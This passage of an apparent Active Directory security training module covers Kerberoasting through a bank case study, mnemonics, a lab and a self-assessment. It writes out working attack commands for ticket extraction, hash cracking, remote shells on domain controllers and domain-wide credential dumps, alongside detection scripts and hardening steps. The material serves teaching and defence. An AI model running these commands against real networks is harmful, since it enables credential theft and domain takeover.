svc_backup)\n\n## Offline Cracking\n\n**Day 1-2: GPU Cracking Farm**\n```bash\n# 4x NVIDIA RTX 4090 GPUs\nhashcat -m 13100 kerberoast.txt -a 0 /wordlists/rockyou.txt -O -w 4\nhashcat -m 13100 kerberoast.txt -a 0 /wordlists/bank-specific.txt -r best64.rule -O -w 4\n```\n\n**Results after 36 hours**:\n```\n✅ svc_backup: \"BackupSvc2019!\" (cracked in 4 hours)\n   - RC4 encryption\n   - Common password pattern (Service + Year + !)\n   - PasswordLastSet: 3 years ago\n\n✅ svc_sharepoint: \"SharePoint@2018\" (cracked in 32 hours)\n   - RC4 encryption  \n   - Predictable pattern\n   - PasswordLastSet: 5 years ago (!)\n   - Member of: Domain Admins 💀\n\n❌ Other 5 accounts: Not cracked (AES256, stronger passwords)\n```\n\n## Exploitation\n\n**Day 2: Domain Compromise**\n```bash\n# Validate credentials\ncrackmapexec smb 10.20.30.40 -u 'svc_sharepoint' -p 'SharePoint@2018' -d bank.local\n\n# SMB: bank.local\\svc_sharepoint:SharePoint@2018 (Pwn3d!)\n# User is Domain Admin!\n\n# Get shell on Domain Controller\npsexec.py bank.local/svc_sharepoint:'SharePoint@2018'@10.20.30.40\n\n# Dump all domain credentials\nsecretsdump.py bank.local/svc_sharepoint:'SharePoint@2018'@10.20.30.40 -just-dc-ntlm\n```\n\n**Result**: Full domain compromise in **36 hours** from initial phishing.\n\n## Root Cause Analysis\n\n**Vulnerabilities Exploited:**\n\n1. **Weak Service Account Passwords**\n   - svc_sharepoint: 16 characters, predictable pattern\n   - PasswordLastSet: 5 years ago (set once, never changed)\n   - No password complexity enforcement beyond default\n\n2. **RC4 Encryption Enabled**\n   - Domain still allowed RC4_HMAC_MD5\n   - Made cracking 100x faster\n   - 2 of 7 accounts used RC4\n\n3. **Excessive Privileges**\n   - SharePoint service account was Domain Admin\n   - No business justification (only needed SharePoint permissions)\n   - Violation of least privilege principle\n\n4. **No Kerberoasting Detection**\n   - Event 4769 logged but not monitored\n   - No SIEM alerts on multiple TGS requests\n   - No honey SPNs deployed\n\n5. **Lack of gMSA Implementation**\n   - All service accounts were traditional user accounts\n   - gMSAs available but not used\n   - Would have prevented attack entirely\n\n## Defender's Perspective: What Was Missed\n\n**Detection Opportunities:**\n\n**Event ID 4769 Analysis (Post-Incident)**\n```xml\nEvent Time: 2024-01-10 14:32:17\nEvent ID: 4769\nAccount Name: helpdesk-user@bank.local\nService Name: svc_sharepoint\nTicket Encryption Type: 0x17 (RC4)\nClient Address: 10.20.45.67\n\n[14:32:17] - Request for HTTP/sharepoint.bank.local\n[14:32:19] - Request for MSSQLSvc/sql-reports.bank.local:1433\n[14:32:21] - Request for HTTP/mail.bank.local\n[14:32:23] - Request for HOST/backup.bank.local\n[14:32:25] - Request for MSSQLSvc/sql-prod.bank.local:1433\n[14:32:27] - Request for HTTP/webapp.bank.local\n[14:32:29] - Request for TERMSRV/rds.bank.local\n\n🚨 7 unique SPN requests in 12 seconds - CLEAR KERBEROASTING INDICATOR\n```\n\n**Why It Wasn't Detected:**\n- Event 4769 generated but not sent to SIEM\n- Security team understaffed, focused on perimeter alerts\n- No automated correlation rules\n- No baseline for \"normal\" TGS request patterns\n\n## Remediation Actions\n\n**Immediate (Day 3-5):**\n```powershell\n# 1. Reset all service account passwords to 30-char random\n$accounts = @(\"svc_sharepoint\", \"svc_exchange\", \"svc_sql_reporting\", \"svc_backup\")\nforeach ($account in $accounts) {\n    $password = -join ((33..126) | Get-Random -Count 30 | ForEach-Object {[char]$_})\n    Set-ADAccountPassword -Identity $account -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force) -Reset\n    Write-Output \"$account : $password\" | Out-File -Append service_passwords_secure.txt\n}\n\n# 2. Remove Domain Admin from service accounts\nRemove-ADGroupMember -Identity \"Domain Admins\" -Members \"svc_sharepoint\" -Confirm:$false\n\n# 3. Force Kerberos re-authentication\nInvoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {klist purge}\n\n# 4. Deploy SIEM alert for Kerberoasting\n# (Splunk query from Detection section)\n```\n\n**Short-term (Week 1-4):**\n1. ✅ Migrate all service accounts to gMSAs\n2. ✅ Disable RC4 encryption domain-wide\n3. ✅ Deploy honey SPNs (3 created with Domain Admin privileges)\n4. ✅ Implement SIEM monitoring for Event 4769\n5. ✅ Conduct service account privilege audit (remove excess permissions)\n\n**Long-term (Month 2-6):**\n1. ✅ Implement PAM solution for service account management\n2. ✅ Regular Kerberoasting penetration tests (quarterly)\n3. ✅ Service account inventory and lifecycle management\n4. ✅ Security awareness training on credential hygiene\n5. ✅ Deploy EDR with behavioral Kerberoasting detection\n\n## Post-Remediation Testing\n\n**6 months later: Re-test**\n```bash\n# Attempt Kerberoasting again\nGetUserSPNs.py bank.local/test-user:'Password123' -dc-ip 10.20.30.40 -request\n```\n\n**Results**:\n```\n✅ 0 user service accounts found (all migrated to gMSA)\n✅ RC4 encryption disabled (only AES128/256 available)\n✅ Honey SPN triggered alert within 30 seconds of request\n✅ Security team responded within 5 minutes\n✅ Test account automatically locked out\n\nKerberoasting attack: PREVENTED ✅\n```\n\n## Lessons Learned\n\n**For Red Teamers:**\n- Kerberoasting remains highly effective in under-secured environments\n- Always request RC4 tickets first (faster cracking)\n- Target accounts with \"PasswordLastSet\" > 1 year\n- Combine with other attacks (don't rely solely on Kerberoasting)\n\n**For Blue Teamers:**\n- **gMSAs are the silver bullet** - migrate immediately\n- Event 4769 monitoring is critical (low false positives when done right)\n- Service accounts with Domain Admin = critical risk\n- Honey SPNs provide near-zero false positive detection\n- Regular password audits catch weak service account passwords\n\n**Key Takeaway**: This organization went from **\"fully vulnerable\"** to **\"Kerberoasting-proof\"** in 6 months through systematic remediation. Your organization can too."
    },
    {
      "type": "memory_aid",
      "title": "Kerberoasting Memory Framework",
      "content": "Use these mnemonics and memory aids to master Kerberoasting concepts.\n\n## KERBEROAST Attack Steps\n\n**K**now your target (enumerate SPNs)\n**E**xtract TGS tickets (request from DC)\n**R**etrieve hashes (extract from memory)\n**B**reak passwords (offline cracking)\n**E**scalate privileges (use cracked credentials)\n**R**epeat for more accounts\n**O**wn the domain (lateral movement)\n**A**ccess sensitive data\n**S**tay persistent\n**T**arget crown jewels\n\n## SPUD Framework (Which SPNs to Target)\n\n**S**ervice account (user, not computer)\n**P**assword old (1+ years since PasswordLastSet)\n**U**nprivileged cracking (RC4 encryption preferred)\n**D**omain admin member (high-value target)\n\n## 4 E's of Encryption (Remember encryption types)\n\n**E**xtra weak: DES (never use, ancient)\n**E**asy to crack: RC4 (0x17) - attackers love this\n**E**xcellent: AES128 (0x08) - good defense\n**E**xceptional: AES256 (0x10) - best defense\n\n## DETECT Framework (Blue Team Detection)\n\n**D**owngrade to RC4 (Event 4769 with encryption 0x17)\n**E**numeration spike (10+ TGS requests in 5 minutes)\n**T**arget unusual SPNs (services user never accessed)\n**E**DR alerts (Rubeus, Invoke-Kerberoast, GetUserSPNs)\n**C**lient address anomalies (Linux/unusual IPs)\n**T**rap with honey SPNs (fake high-value accounts)\n\n## Visual Memory: The Kerberoasting Flow\n\n```\n   ┌─────────────┐\n   │  Low-Priv   │  \"I'm just a regular user...\"\n   │    User     │\n   └──────┬──────┘\n          │\n          ├─────────────────────────────────────┐\n          │                                     │\n     1. ENUMERATE                          2. REQUEST\n   \"Show me all SPNs\"                 \"Give me TGS tickets\"\n          │                                     │\n          ▼                                     ▼\n   ┌─────────────┐                      ┌─────────────┐\n   │    LDAP     │                      │   Domain    │\n   │   Query     │                      │ Controller  │\n   └──────┬──────┘                      └──────┬──────┘\n          │                                     │\n   Returns: 15 SPNs              Returns: TGS encrypted with\n   svc_mssql                     service account password\n   svc_sharepoint                         │\n   svc_exchange                           │\n          │                                     │\n          └─────────────┬───────────────────────┘\n                        │\n                   3. EXTRACT\n                \"Convert to hash\"\n                        │\n                        ▼\n              $krb5tgs$23$*svc_mssql...\n                        │\n                        │\n                   4. CRACK\n              \"Try millions of passwords\"\n                        │\n                        ▼\n                 hashcat -m 13100\n                 [████████████] 100%\n                        │\n                        ▼\n              Password: \"Summer2019!\"\n                        │\n                        │\n                   5. VALIDATE\n                        │\n                        ▼\n              svc_mssql = Domain Admin\n                        │\n                        ▼\n                  🎯 DOMAIN OWNED\n```\n\n## Password Cracking Time Cheat Sheet\n\n**Memorize these benchmarks (RTX 3090 GPU, RC4 encryption):**\n\n```\n8 chars, lowercase only       →  INSTANT (seconds)\n8 chars, mixed case + numbers →  2 minutes\n10 chars, mixed + special     →  2 hours\n12 chars, mixed + special     →  15 minutes (with wordlist)\n16 chars, random              →  3 days (brute force)\n25 chars, random              →  5,000+ years ✅ SAFE\ngMSA (127 chars, auto-rotate) →  ∞ UNCRACKABLE ✅\n```\n\n## Event ID Quick Reference\n\n**Critical Windows Events for Kerberoasting:**\n\n- **4768**: Kerberos TGT (initial auth) - not directly useful\n- **4769**: Kerberos TGS (service ticket) - **PRIMARY DETECTION**\n  - RC4 = 0x17 = 🚨 ALERT\n  - AES128 = 0x08 = normal\n  - AES256 = 0x10 = normal\n- **4770**: Kerberos ticket renewed - not directly useful\n- **4771**: Kerberos pre-auth failed - failed login, not Kerberoasting\n\n**Remember**: **4769 is your friend** for detection.\n\n## SPN Format Memory Aid\n\n**Think of SPN as a postal address:**\n\n```\nServiceClass/Host:Port/InstanceName\n     │         │    │        │\n     │         │    │        └─ Apartment number (optional)\n     │         │    └────────── PO Box (optional)\n     │         └─────────────── Street address (required)\n     └───────────────────────── City (required)\n\nExample:\nMSSQLSvc/sql01.corp.local:1433/PRODUCTION\n   │        │                │       │\n   │        │                │       └─ SQL instance name\n   │        │                └───────── Port 1433\n   │        └────────────────────────── Server FQDN\n   └─────────────────────────────────── SQL Server service\n```\n\n## Tools Cheat Sheet\n\n**Windows (Post-Exploitation):**\n- **Rubeus**: Swiss Army knife (enumerate + extract + crack prep)\n- **Invoke-Kerberoast**: PowerShell script (stealthy)\n- **Mimikatz**: Extract tickets from memory\n- **setspn**: Built-in SPN enumeration (stealthy)\n\n**Linux (Remote Attack):**\n- **GetUserSPNs.py**: Impacket (enumerate + request + output to hashcat)\n- **kerbrute**: Username enumeration + Kerberoasting\n\n**Cracking:**\n- **Hashcat**: GPU cracking (fastest) - mode 13100 (RC4), 19600 (AES128), 19700 (AES256)\n- **John the Ripper**: CPU cracking - format krb5tgs\n\n**Memory Trick**: **\"RIM\"** for Windows tools:\n- **R**ubeus\n- **I**nvoke-Kerberoast\n- **M**imikatz\n\n## Defense Priority Stack\n\n**Think of defense as a pyramid (bottom = foundation):**\n\n```\n                     ▲\n                    ╱ ╲\n                   ╱ 5 ╲      Tier 5: Honey SPNs (detect)\n                  ╱─────╲\n                 ╱   4   ╲    Tier 4: SIEM alerts (detect)\n                ╱─────────╲\n               ╱     3     ╲  Tier 3: Disable RC4 (slow down)\n              ╱─────────────╲\n             ╱       2       ╲ Tier 2: Strong passwords (prevent)\n            ╱─────────────────╲\n           ╱        1          ╲ Tier 1: gMSA (PREVENT) ✅ FOUNDATION\n          ╱─────────────────────╲\n         ═══════════════════════════\n```\n\n**Build from bottom up**: gMSA first, then add layers.\n\n## Quick Decision Tree: \"Is This Kerberoastable?\"\n\n```\nIs it a user account? ────────NO────→ Skip (computer accounts = safe)\n        │\n       YES\n        ↓\nDoes it have an SPN? ─────────NO────→ Skip (can't Kerberoast without SPN)\n        │\n       YES\n        ↓\nIs it a gMSA? ────────────────YES───→ Skip (127 chars, can't crack)\n        │\n        NO\n        ↓\nPassword > 20 random chars? ──YES───→ Probably not worth trying\n        │\n        NO\n        ↓\nPasswordLastSet < 1 year? ────YES───→ Might be strong (manual check)\n        │\n        NO\n        ↓\n    🎯 TARGET THIS ACCOUNT!\n```\n\nUse these memory aids during engagements and investigations. Print them out. Test yourself. **Repetition builds mastery.**"
    },
    {
      "type": "code_exercise",
      "title": "Hands-On Lab: Kerberoasting Attack and Defense",
      "content": "Set up a vulnerable Active Directory lab and practice both offensive and defensive techniques.\n\n## Lab Setup Requirements\n\n**Infrastructure:**\n- Domain Controller: Windows Server 2019/2022\n- Workstation: Windows 10/11 (attacker machine)\n- Domain: `lab.local`\n- Tools: PowerShell, Rubeus, Hashcat\n\n**Vulnerable Service Accounts to Create:**\n```powershell\n# On Domain Controller, create vulnerable service accounts\n\n# 1. SQL Service Account (weak password, Domain Admin)\nNew-ADUser -Name \"svc_mssql\" -AccountPassword (ConvertTo-SecureString \"SQLService2019!\" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"svc_mssql\"\nsetspn -A MSSQLSvc/sql01.lab.local:1433 svc_mssql\n\n# 2. SharePoint Service Account (medium password)\nNew-ADUser -Name \"svc_sharepoint\" -AccountPassword (ConvertTo-SecureString \"SharePoint@2020\" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true\nsetspn -A HTTP/sharepoint.lab.local svc_sharepoint\n\n# 3. IIS Service Account (strong password - should resist cracking)\nNew-ADUser -Name \"svc_iis\" -AccountPassword (ConvertTo-SecureString \"z9@Kx4#mQ8$vL2!pN7&yR6^tG5*hJ3wD\" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true\nsetspn -A HTTP/webapp.lab.local svc_iis\n\n# 4. Create gMSA (immune to Kerberoasting)\nAdd-KdsRootKey -EffectiveImmediately\nNew-ADServiceAccount -Name \"svc_exchange_gMSA\" -DNSHostName \"mail.lab.local\" -PrincipalsAllowedToRetrieveManagedPassword \"Domain Computers\"\nSet-ADServiceAccount -Identity \"svc_exchange_gMSA\" -ServicePrincipalNames @{Add=\"HTTP/mail.lab.local\"}\n```\n\n## Exercise 1: Enumerate SPNs (Reconnaissance)\n\n**Objective**: Discover all service accounts with SPNs in the domain.\n\n**Task 1.1 - Built-in Windows Tools:**\n```powershell\n# Login as low-privilege user (bob@lab.local)\n\n# Method 1: setspn (stealthy, built-in)\nsetspn -T lab.local -Q */*\n\n# Method 2: PowerShell AD module\nImport-Module ActiveDirectory\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName,PasswordLastSet,MemberOf | Format-Table Name,ServicePrincipalName,PasswordLastSet\n```\n\n**Expected Output:**\n```\nName              ServicePrincipalName                  PasswordLastSet\n----              --------------------                  ---------------\nDC01$             HOST/DC01.lab.local                  [recent date - skip]\nDC01$             RestrictedKrbHost/DC01.lab.local     [recent date - skip]\nsvc_mssql         MSSQLSvc/sql01.lab.local:1433        [old date - TARGET!]\nsvc_sharepoint    HTTP/sharepoint.lab.local            [old date - TARGET!]\nsvc_iis           HTTP/webapp.lab.local                [recent date - target]\nsvc_exchange_gMSA HTTP/mail.lab.local                  [auto - gMSA, skip]\n```\n\n**Task 1.2 - Analyze Results:**\nIdentify which accounts are:\n1. Computer accounts (end with $) → **Skip**\n2. gMSAs (127-char passwords) → **Skip**\n3. User service accounts with old PasswordLastSet → **Target**\n\n**Questions:**\n- How many user service accounts did you find?\n- Which has the oldest PasswordLastSet date?\n- Are any members of Domain Admins?\n\n## Exercise 2: Request and Extract TGS Tickets\n\n**Objective**: Request Kerberos TGS tickets for service accounts and extract them for offline cracking.\n\n**Task 2.1 - PowerShell Method:**\n```powershell\n# Request TGS ticket manually\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/sql01.lab.local:1433\"\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/sharepoint.lab.local\"\n\n# Verify tickets in cache\nklist\n```\n\n**Task 2.2 - Rubeus Method (Automated):**\n```powershell\n# Download Rubeus from GitHub (pre-compiled or build from source)\n# https://github.com/GhostPack/Rubeus\n\n# Kerberoast all accounts\n.\\Rubeus.exe kerberoast /outfile:tickets.txt\n\n# Kerberoast specific account\n.\\Rubeus.exe kerberoast /user:svc_mssql /outfile:svc_mssql_ticket.txt\n\n# Request RC4 tickets (faster to crack)\n.\\Rubeus.exe kerberoast /rc4opsec /outfile:tickets_rc4.txt\n```\n\n**Task 2.3 - Impacket Method (Linux):**\n```bash\n# From Kali Linux or other attack box\npython3 GetUserSPNs.py lab.local/bob:'Password123!' -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt\n\n# Enumerate only (no ticket request)\npython3 GetUserSPNs.py lab.local/bob:'Password123!' -dc-ip 192.168.1.10\n```\n\n**Expected Output Format:**\n```\n$krb5tgs$23$*svc_mssql$LAB.LOCAL$MSSQLSvc/sql01.lab.local:1433*$a1b2c3d4e5f6...[long hash]\n$krb5tgs$23$*svc_sharepoint$LAB.LOCAL$HTTP/sharepoint.lab.local*$g7h8i9j0k1l2...[long hash]\n```\n\n**Questions:**\n- How many hashes did you extract?\n- What encryption type is used (check output)?\n- Which method was easiest for you?\n\n## Exercise 3: Offline Password Cracking\n\n**Objective**: Crack the extracted TGS tickets to recover service account passwords.\n\n**Task 3.1 - Hashcat GPU Cracking:**\n```bash\n# Copy tickets.txt to machine with GPU\n\n# Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4)\nhashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt --force\n\n# With rules for better coverage\nhashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\n# Create custom wordlist with common service account patterns\necho -e \"SQLService2019!\\nSQLService2020!\\nSharePoint@2020\\nSharePoint@2021\" > service_passwords.txt\nhashcat -m 13100 tickets.txt service_passwords.txt --force\n\n# Show cracked passwords\nhashcat -m 13100 tickets.txt --show\n```\n\n**Task 3.2 - John the Ripper CPU Cracking:**\n```bash\n# Convert Rubeus output to John format (if needed)\n# Usually Rubeus output works directly\n\njohn --wordlist=/usr/share/wordlists/rockyou.txt tickets.txt\n\n# With mangling rules\njohn --wordlist=/usr/share/wordlists/rockyou.txt --rules tickets.txt\n\n# Show cracked passwords\njohn --show tickets.txt\n```\n\n**Expected Results:**\n```\nCracking performance:\n- svc_mssql (\"SQLService2019!\") → Cracked in < 5 minutes\n- svc_sharepoint (\"SharePoint@2020\") → Cracked in < 30 minutes\n- svc_iis (30-char random) → NOT cracked after hours\n```\n\n**Questions:**\n- Which passwords cracked successfully?\n- How long did each take?\n- Why didn't svc_iis crack?\n\n## Exercise 4: Validate and Exploit\n\n**Objective**: Use cracked credentials to escalate privileges.\n\n**Task 4.1 - Validate Credentials:**\n```powershell\n# Test if credentials work\n$password = ConvertTo-SecureString 'SQLService2019!' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('LAB\\svc_mssql', $password)\n\nInvoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock {whoami; whoami /groups}\n```\n\n**Task 4.2 - Check Privileges:**\n```powershell\n# Check group membership\nnet user svc_mssql /domain\n\n# Using crackmapexec (Linux)\ncrackmapexec smb 192.168.1.10 -u 'svc_mssql' -p 'SQLService2019!' -d lab.local\n```\n\n**Task 4.3 - Escalate (if Domain Admin):**\n```bash\n# If svc_mssql is Domain Admin, get shell on DC\npsexec.py lab.local/svc_mssql:'SQLService2019!'@192.168.1.10\n\n# Dump all credentials\nsecretsdump.py lab.local/svc_mssql:'SQLService2019!'@192.168.1.10 -just-dc-ntlm\n```\n\n## Exercise 5: Blue Team - Detection\n\n**Objective**: Detect the Kerberoasting attack you just performed.\n\n**Task 5.1 - Review Event Logs:**\n```powershell\n# On Domain Controller, search for Event 4769\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4769]]\" -MaxEvents 100 | \n  ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    [PSCustomObject]@{\n      TimeCreated = $_.TimeCreated\n      AccountName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'\n      ServiceName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ServiceName'} | Select-Object -ExpandProperty '#text'\n      TicketEncryption = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TicketEncryptionType'} | Select-Object -ExpandProperty '#text'\n      ClientAddress = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'\n    }\n  } | Where-Object {$_.TicketEncryption -eq '0x17'} | Format-Table -AutoSize\n```\n\n**Task 5.2 - Identify Attack Patterns:**\nLook for:\n- Multiple TGS requests from same account within minutes\n- Encryption type 0x17 (RC4)\n- Services the user doesn't normally access\n\n**Task 5.3 - Create Detection Rule:**\n```powershell\n# Create scheduled task to alert on Kerberoasting\n$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-File C:\\Scripts\\Kerberoast-Detector.ps1'\n$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName \"Kerberoast Detector\" -Description \"Detects potential Kerberoasting attacks\"\n```\n\n**Kerberoast-Detector.ps1:**\n```powershell\n# Alert on multiple TGS requests with RC4\n$events = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769;StartTime=(Get-Date).AddMinutes(-5)} -ErrorAction SilentlyContinue\n\n$suspiciousAccounts = $events | ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    [PSCustomObject]@{\n        Account = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'\n        Service = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ServiceName'} | Select-Object -ExpandProperty '#text'\n        Encryption = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TicketEncryptionType'} | Select-Object -ExpandProperty '#text'\n    }\n} | Where-Object {$_.Encryption -eq '0x17' -and $_.Service -notlike '*$'} | \n  Group-Object Account | Where-Object {$_.Count -ge 5}\n\nif ($suspiciousAccounts) {\n    $message = \"KERBEROASTING ALERT: \" + ($suspiciousAccounts | ForEach-Object {$_.Name + \" (\" + $_.Count + \" requests)\"}) -join \", \"\n    Write-EventLog -LogName Application -Source \"Kerberoast Detector\" -EntryType Warning -EventId 1001 -Message $message\n    # Send email alert here\n}\n```\n\n## Exercise 6: Blue Team - Mitigation\n\n**Objective**: Harden the environment against Kerberoasting.\n\n**Task 6.1 - Implement gMSAs:**\n```powershell\n# Migrate svc_mssql to gMSA\n# 1. Create gMSA\nNew-ADServiceAccount -Name \"svc_mssql_gMSA\" -DNSHostName \"sql01.lab.local\" -PrincipalsAllowedToRetrieveManagedPassword \"SQL-Servers-Group\"\n\n# 2. Set SPN on gMSA\nSet-ADServiceAccount -Identity \"svc_mssql_gMSA\" -ServicePrincipalNames @{Add=\"MSSQLSvc/sql01.lab.local:1433\"}\n\n# 3. On SQL server, install gMSA\nInstall-ADServiceAccount -Identity \"svc_mssql_gMSA\"\n\n# 4. Update SQL Server service to use gMSA\n# Services → SQL Server (MSSQLSERVER) → Properties → Log On\n# Account: LAB\\svc_mssql_gMSA$\n# Password: (leave blank)\n\n# 5. Remove old account\nRemove-ADGroupMember -Identity \"Domain Admins\" -Members \"svc_mssql\" -Confirm:$false\nDisable-ADAccount -Identity \"svc_mssql\"\n```\n\n**Task 6.2 - Disable RC4 Encryption:**\n```powershell\n# Via Group Policy:\n# Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options\n# \"Network security: Configure encryption types allowed for Kerberos\"\n# Uncheck: RC4_HMAC_MD5\n# Check: AES128_HMAC_SHA1, AES256_HMAC_SHA1\n\n# Via PowerShell (set on service account):\nSet-ADUser -Identity svc_sharepoint -Replace @{'msDS-SupportedEncryptionTypes'=24}  # 24 = AES128 + AES256\n\n# Force Kerberos policy refresh\ngpupdate /force\n```\n\n**Task 6.3 - Deploy Honey SPN:**\n```powershell\n# Create attractive honeypot account\nNew-ADUser -Name \"svc_admin_backup\" -AccountPassword (ConvertTo-SecureString \"HoneyPotPassword!@#$%\" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true\nSet-ADUser -Identity \"svc_admin_backup\" -ServicePrincipalNames @{Add=\"MSSQLSvc/sql-prod-critical.lab.local:1433\"}\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"svc_admin_backup\"\n\n# Create alert for ANY access to this SPN\n# (Use detection script from Exercise 5, filter for this specific ServiceName)\n```\n\n**Task 6.4 - Reset All Service Account Passwords:**\n```powershell\n# Generate strong 30-character passwords\n$serviceAccounts = @(\"svc_sharepoint\", \"svc_iis\")\nforeach ($account in $serviceAccounts) {\n    $password = -join ((33..126) | Get-Random -Count 30 | ForEach-Object {[char]$_})\n    Set-ADAccountPassword -Identity $account -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force) -Reset\n    Write-Output \"$account password reset. New password: $password\"\n    # Store in password vault\n}\n```\n\n## Exercise 7: Validation and Reporting\n\n**Task 7.1 - Re-test Kerberoasting After Mitigation:**\n```powershell\n# Try to Kerberoast again\n.\\Rubeus.exe kerberoast /outfile:tickets_after_mitigation.txt\n\n# Observations:\n# - svc_mssql: Now gMSA (127 chars, uncrackable)\n# - svc_sharepoint: Now AES256 (slower to crack)\n# - svc_iis: Strong password (still won't crack)\n# - Honey SPN: Triggers immediate alert\n```\n\n**Task 7.2 - Create Report:**\nDocument:\n1. Vulnerable accounts found (before mitigation)\n2. Passwords successfully cracked\n3. Detection methods implemented\n4. Mitigation steps taken\n5. Residual risks (if any)\n6. Recommendations\n\n## Lab Deliverables\n\n✅ List of all SPNs enumerated\n✅ Extracted TGS tickets (hashes)\n✅ Cracked passwords\n✅ Evidence of successful exploitation\n✅ Event log analysis showing attack indicators\n✅ Detection rule/script\n✅ Mitigation implementation (gMSA, password resets, RC4 disabled)\n✅ Re-test results showing improved security\n✅ Final report\n\n## Bonus Challenges\n\n**Challenge 1**: Automate the entire attack chain (enumerate → extract → crack → exploit) in a single script.\n\n**Challenge 2**: Build a real-time dashboard showing TGS requests and flagging anomalies.\n\n**Challenge 3**: Implement automated remediation that locks out accounts showing Kerberoasting behavior.\n\n**Challenge 4**: Test cracking times with different GPU models and document results.\n\nComplete this lab, and you'll have hands-on mastery of both offensive and defensive Kerberoasting techniques."
    },
    {
      "type": "reflection",
      "title": "Self-Assessment and Reflection",
      "content": "Take a moment to reflect on your learning journey through Kerberoasting.\n\n## Knowledge Check Questions\n\n**Question 1: Attack Understanding**\nExplain in your own words why Kerberoasting works. What is the fundamental design choice in Kerberos that enables this attack?\n\n**Question 2: Encryption Impact**\nYou've extracted two TGS tickets:\n- Ticket A: Encrypted with RC4 (0x17)\n- Ticket B: Encrypted with AES256 (0x10)\n\nBoth service accounts have 12-character passwords. Which should you attempt to crack first, and why?\n\n**Question 3: Real-World Scenario**\nYou've gained access to a corporate network with a low-privilege user account. You perform SPN enumeration and find:\n- 50 computer accounts with SPNs (passwords 120+ characters)\n- 5 user service accounts:\n  - svc_sql: PasswordLastSet 2018, Domain Admins member, RC4 encryption\n  - svc_web: PasswordLastSet 2023, IIS_IUSRS member, AES256 encryption\n  - svc_backup: PasswordLastSet 2021, Backup Operators member, RC4 encryption\n  - svc_monitoring: gMSA, Domain Users member\n  - svc_print: PasswordLastSet 2020, Print Operators member, AES256 encryption\n\nWhich account would you target first? Justify your choice with at least 3 reasons.\n\n**Question 4: Detection Blind Spots**\nA security analyst implements Event ID 4769 monitoring to detect Kerberoasting. However, they're only alerting on TGS requests with RC4 encryption. What attack variation could bypass this detection, and how would you improve the detection rule?\n\n**Question 5: Defense Priority**\nYou're a security engineer with limited time and budget. You can implement ONE of these mitigations:\nA) Migrate all service accounts to gMSAs (3 months, $10K)\nB) Reset all service account passwords to 25+ characters (1 week, $1K)\nC) Deploy honey SPNs and SIEM alerting (2 weeks, $3K)\nD) Disable RC4 encryption domain-wide (1 day, $500)\n\nWhich do you choose and why? What would be your implementation order if you could eventually do all four?\n\n## Reflection Prompts\n\n**Prompt 1: Attacker Mindset**\n\"The best defenders think like attackers.\"\n\nReflect on your learning:\n- What surprised you most about how easy/difficult Kerberoasting is?\n- How has learning this attack changed your understanding of Active Directory security?\n- If you were to design Kerberos today, what would you change to prevent this attack?\n\n**Prompt 2: Defender Challenges**\n\"Prevention is ideal, but detection is a must.\"\n\nConsider:\n- Why might an organization have difficulty implementing gMSAs despite them being a complete solution?\n- What organizational or technical barriers prevent migration from traditional service accounts?\n- How would you advocate for Kerberoasting defenses to non-technical leadership?\n\n**Prompt 3: Ethical Considerations**\n\"With great power comes great responsibility.\"\n\nKerberoasting is a powerful technique. Reflect:\n- What are the legal and ethical boundaries of using this technique?\n- How would you explain the difference between authorized penetration testing and unauthorized hacking to someone unfamiliar with security?\n- What steps would you take to ensure you never cross ethical lines while learning offensive security?\n\n## Learning Application\n\n**Next Steps for Red Teamers:**\n- ✅ Practice Kerberoasting in your home lab (never on systems you don't own)\n- ✅ Study related AD attacks (Golden Ticket, Pass-the-Hash, DCSync)\n- ✅ Learn to chain Kerberoasting with other techniques\n- ✅ Understand defensive measures to craft more sophisticated attacks\n\n**Next Steps for Blue Teamers:**\n- ✅ Audit your organization's service accounts TODAY\n- ✅ Identify which accounts have old passwords or excessive privileges\n- ✅ Implement at minimum: Event 4769 monitoring and strong passwords\n- ✅ Build a roadmap for gMSA migration\n- ✅ Deploy honey SPNs as early warning system\n\n**Next Steps for Everyone:**\n- ✅ Complete the hands-on lab (Exercise section)\n- ✅ Read real-world Kerberoasting case studies\n- ✅ Follow Active Directory security researchers on Twitter/blogs\n- ✅ Practice explaining Kerberoasting to someone non-technical\n\n## Jim Kwik Integration: Active Recall\n\n**Test yourself** (without looking back at the lesson):\n\n1. What does SPN stand for?\n2. Which Event ID detects TGS requests?\n3. What is the 